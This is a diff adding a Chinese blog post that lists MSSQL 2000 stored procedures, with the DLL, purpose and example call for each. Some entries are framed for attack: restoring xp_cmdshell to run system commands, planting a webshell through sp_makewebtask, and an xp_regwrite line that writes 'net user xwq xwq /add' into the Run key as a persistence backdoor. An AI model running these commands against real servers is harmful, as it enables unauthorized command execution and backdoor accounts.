@@ -1,0 +1,118 @@
+MSSQL2000常用存储过程2010-03-26 00:28MSSQL 2000存储过程简介
+http://hi.baidu.com/eshells/blog/item/e0d700c876c7ed13be09e6ca.html
+
+存储过程：Mssql语句执行的时候要先编译，然后执行。存储过程（Stored Procedure）是一组为了完成特定功能的SQL语句集，经编译后存储在数据库中。用户通过指定存储过程的名字并给出参数（如果该存储过程带有参数）来执行它。存储过程是数据库中的一个重要对象，任何一个设计良好的数据库应用程序都应该用到存储过程。
+
+
+存储过程的种类： 
+　　1、系统存储过程以sp_开头，用来进行系统的各项设定。取得信息相关管理工作。 
+　　2、扩展存储过程以XP_开头，用来调用操作系统提供的功能。 
+　　3、用户自定义的存储过程，这是我们所指的存储过程。
+
+
+查找存储过程对应的Dll文件
+    select o.name,c.text from dbo.syscomments c, dbo.sysobjects o where c.id = o.id and o.name = 'xp_cmdshell' 
+查找Dll文件对应的存储过程 
+    select o.name,c.text from dbo.syscomments c, dbo.sysobjects o where c.id = o.id and c.text = 'xplog70.dll' 
+查询DLL文件与对应存储过程关联 
+    select text,object_name(id) as spname from syscomments where text like '%.dll%'
+
+
+常用存储过程简介： 
+    1、SP_Who2 （DB_Owner权限）
+       作   用：查看SqlServer数据库连接信息。 
+       用   法：exec master.dbo.sp_who2 
+    2、SP_AddExtendedProc （SA权限）
+       作   用：添加、恢复存储过程。 
+       用   法：exec master.dbo.sp_addextendedproc 'xp_cmdshell','xplog70.dll' 
+    3、SP_DropExtendedProc （SA权限）
+       作   用：删除存储过程。 
+       用   法：exec master.dbo.sp_dropextendedproc 'xp_cmdshell' 
+    4、SP_OACreate 
+       对应DLL：odsole70.dll 
+       作   用：配合SP_OAMethod执行命令 
+    5、SP_OAMethod 
+       对应DLL：odsole70.dll 
+       作   用：配合SP_ OACreate执行命令 
+   6、SP_MakeWebTask （SA权限）
+       作   用：在知道WEB绝对路径的前提下，可以通过备份得到webshell 
+   7、XP_CmdShell （SA权限）
+       对应DLL：xplog70.dll 
+       作   用：执行系统命令。 
+       用   法：exec master.dbo.xp_cmdshell 'net user' 
+   8、XP_DirTree 
+       对应DLL：xpstar.dll 
+       作   用：遍历目录。 
+       用   法：exec master.dbo.xp_dirtree 'c:\' 
+   9、XP_EnumGroups 
+       对应DLL：xplog70.dll 
+       作   用：列出服务器上所有windows本地组 
+       用   法：exec master.dbo.xp_enumgroups 
+   10、XP_FixedDrives 
+       对应DLL：xpstar.dll 
+       作   用：查看硬盘分区及可用空间。 
+       用   法：exec master.dbo.xp_fixeddrives 
+   11、XP_FileExist 
+       对应DLL：xpstar.dll 
+       作   用：判断文件是否存在。 
+       用   法：exec master.dbo.xp_fileexist 'c:\boot.ini' 
+   12、XP_GetNetName 
+       对应DLL：xpstar.dll 
+       作   用：查看计算机名字 
+       用   法：execute master.dbo.xp_getnetname 
+   13、XP_LoginConfig 
+       对应DLL：xplog70.dll 
+       作   用：获得服务器安全模式信息。 
+       用   法：exec master.dbo.xp_loginconfig 
+   14、XP_ReadErrorLog 
+       对应DLL：xpstar.dll 
+       作   用：列出SqlServer错误日志的具体内容。 
+       用   法：exec master.dbo.xp_readerrorlog 
+   15、XP_RegRead 
+       对应DLL：xpstar.dll 
+       作   用：读取注册表的键值。 
+       用   法：exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','system\controlset001\
+       control\computername\computername','computername' 
+   16、XP_RegAddMultiString 
+       对应DLL：xpstar.dll 
+       作   用：向注册表中添加某键值的值。 
+       用   法：exec master.dbo.XP_RegAddMultiString 'HKEY_LOCAL_MACHINE','software\ 
+                Microsoft\Windows\CurrentVersion','test','hello' 
+   17、XP_RegDeleteKey 
+       对应DLL：xpstar.dll 
+       作   用：删除注册表某个键及其下的键值。 
+       用   法：exec master.dbo.xp_regdeletekey 'HKEY_LOCAL_MACHINE','SOFTWARE\ 
+                Microsoft\Windows\CurrentVersion\Testkey' 
+   18、XP_RegDeleteValue 
+       对应DLL：xpstar.dll 
+       作   用：删除注册表某个值。 
+       用   法：exec master.dbo.xp_regdeletevalue 'HKEY_LOCAL_MACHINE','SOFTWARE\ 
+                Microsoft\Windows\CurrentVersion','TestValueName' 
+   19、XP_RegeNumValues 
+       对应DLL：xpstar.dll 
+       作   用：以多个记录集方式返回所有键值。 
+       用   法：exec master.dbo.XP_RegeNumValues 'HKEY_LOCAL_MACHINE','software\ 
+                microsoft\windows\currentversion\run' 
+   20、XP_RegWrite 
+       对应DLL：xpstar.dll 
+       作   用：修改注册表的键值。 
+       用   法：Exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\ 
+                Windows\currentvers ion\run','xwq1','REG_SZ','net user xwq xwq /add' 
+   21、XP_RegReMoveMultiString 
+       对应DLL：xpstar.dll 
+       作   用：从注册表中删除键值下的值，但不删除该键值。 
+       用   法：exec master.dbo.xp_regremovemultistring 'HKEY_LOCAL_MACHINE','software\ 
+                Microsoft\Windows\CurrentVersion','test','hello' 
+   22、XP_ReadErrorLog （SA权限）
+       对应DLL：xpstar.dll 
+       作       用：列出Sql Server错误日志的具体内容。 
+       用       法：exec master.dbo.xp_readerrorlog 
+   23、XP_SubDirs （SA权限）
+       对应DLL：xpstar.dll 
+       作       用：获取子目录。 
+       用       法：exec master.dbo.xp_subdirs 'c:\' 
+   24、xp_servicecontrol （SA权限）
+       对应DLL：xpstar.dll 
+       作       用：启动服务。 
+       用       法：exec master.dbo.xp_servicecontrol 'start','SQLSERVERAGENT'
+ 
